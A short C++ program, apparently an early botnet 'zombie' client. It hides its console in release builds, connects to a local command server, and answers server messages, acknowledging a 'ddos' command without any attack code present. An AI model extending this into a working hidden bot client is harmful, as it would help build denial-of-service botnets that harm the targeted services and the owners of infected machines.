#include "Client.h"

#include <thread>
#include <mutex>
#include <condition_variable>

static std::string rcvMsg;
static std::condition_variable cv;
static std::mutex mutex;

void waitingForServerMsg(Client& zombie)
{
	while (true)
	{
		std::unique_lock<std::mutex> ul(mutex);
		if (zombie.receiveFromServer())
			rcvMsg = zombie.getSrvMsg();
		cv.wait(ul, []() {return rcvMsg.empty(); });
	}
}


int main()
{
#ifdef RELEASE
	FreeConsole();
#endif
	std::cout << "Init Zombie" << std::endl;

	Client Zombie;

	if (!Zombie.init())
		return 0;

	if (Zombie.createSocket())
	{
		if (Zombie.connectToSrv("127.0.0.1", 54002))
		{
			std::cout << "connected" << std::endl;
			std::thread worker(waitingForServerMsg, std::ref(Zombie));
			worker.detach();
			while (true)
			{
				std::lock_guard guard1(mutex);
				if (!rcvMsg.empty())
				{
					std::cout << rcvMsg << std::endl;
					if (rcvMsg == "ddos")
						Zombie.sendToSrv("Started Ddos", strlen("Started Ddos"));
					else
						Zombie.sendToSrv(rcvMsg.c_str(), rcvMsg.size());
					rcvMsg.clear();
					cv.notify_one();
				}
			}
		}
		else
		{
			std::cout << "Couldnt connect to srv" << std::endl;
		}
	}
	else
	{
		std::cout << "Couldnt create Socket" << std::endl;
	}
	
	return 0;
}